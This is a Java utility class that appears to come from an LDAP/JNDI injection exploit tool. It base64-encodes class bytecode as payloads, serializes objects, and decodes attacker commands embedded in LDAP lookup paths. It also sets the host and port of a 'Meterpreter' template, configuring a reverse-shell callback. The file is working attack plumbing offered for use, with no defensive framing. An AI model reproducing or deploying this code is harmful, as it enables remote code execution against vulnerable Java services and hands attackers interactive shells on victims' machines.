package com.feihong.ldap.utils;

import com.feihong.ldap.template.Meterpreter;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Random;

public class Util {
    public static String getRandomString() {
        String str = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 10; i++) {
            char ch = str.charAt(new Random().nextInt(str.length()));
            sb.append(ch);
        }
        return sb.toString();
    }

    public static String getClassCode(Class clazz) throws Exception {
        byte[] bytes=null;
        if (clazz.getName().equals("com.feihong.ldap.template.Meterpreter")){
            bytes=ClassByteChange.update(Meterpreter.class);

        }else {
            bytes=getClassBytes(clazz);
        }


        String result = Util.base64Encode(bytes);

        return result;
    }

    public static byte[] getClassBytes(Class clazz) throws Exception {
        String className = clazz.getName();
        String resoucePath = className.replaceAll("\\.", "/") + ".class";
        InputStream in = Util.class.getProtectionDomain().getClassLoader().getResourceAsStream(resoucePath);
        byte[] bytes = new byte[1024];
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        int len = 0;
        while((len = in.read(bytes)) != -1){
            baous.write(bytes, 0 , len);
        }

        in.close();
        baous.close();

        return baous.toByteArray();
    }

    public static String base64Encode(byte[] bytes) throws Exception{
        String result;

        try{
            Class clazz = Class.forName("java.util.Base64");
            Method method = clazz.getDeclaredMethod("getEncoder");
            Object obj = method.invoke(null);
            method = obj.getClass().getDeclaredMethod("encodeToString", byte[].class);
            obj = method.invoke(obj, bytes);
            result = (String)obj;
        }catch(ClassNotFoundException e){
            Class clazz = Class.forName("sun.misc.BASE64Encoder");
            Method method = clazz.getMethod("encodeBuffer", byte[].class);
            Object obj = method.invoke(clazz.newInstance(), bytes);
            result = (String)obj;
            result = result.replaceAll("\r|\n|\r\n", "");
        }

        return result;
    }

    public static byte[] base64Decode(String str) throws Exception{
        byte[] bytes;

        try{
            Class clazz = Class.forName("java.util.Base64");
            Method method = clazz.getDeclaredMethod("getDecoder");
            Object obj = method.invoke(null);
            method = obj.getClass().getDeclaredMethod("decode", String.class);
            obj = method.invoke(obj, str);
            bytes = (byte[]) obj;
        }catch(ClassNotFoundException e){
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            Method method = clazz.getMethod("decodeBuffer", String.class);
            Object obj = method.invoke(clazz.newInstance(), str);
            bytes = (byte[]) obj;
        }

        return bytes;
    }

    public static byte[] serialize(Object ref) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(ref);
        return out.toByteArray();
    }

    public static String getCmdFromBase(String base) throws Exception {
        int firstIndex = base.lastIndexOf("/");
        String cmd = base.substring(firstIndex + 1);

        int secondIndex = base.lastIndexOf("/", firstIndex - 1);
        if(secondIndex < 0){
            secondIndex = 0;
        }

        if(base.substring(secondIndex + 1, firstIndex).equalsIgnoreCase("base64")){
            byte[] bytes = Util.base64Decode(cmd);
            cmd = new String(bytes);
        }

        return cmd;
    }

    public static String[] getIPAndPortFromBase(String base) throws NumberFormatException{
        int firstIndex = base.lastIndexOf("/");
        String port = base.substring(firstIndex + 1);

        int secondIndex = base.lastIndexOf("/", firstIndex - 1);
        if(secondIndex < 0){
            secondIndex = 0;
        }

        String ip = base.substring(secondIndex + 1, firstIndex);
        return new String[]{ip, Integer.parseInt(port) + ""};
    }

    public static Class<Meterpreter> getMeterpreter(Class<Meterpreter> clazz,String host,String port) throws NoSuchFieldException, IllegalAccessException {
        Field hostField=clazz.getField("host");
//        hostField.setAccessible(true);
        Field portField=clazz.getField("port");
//        portField.setAccessible(true);
        hostField.set(null,host);
        portField.set(null,port);
        return clazz;
    }
}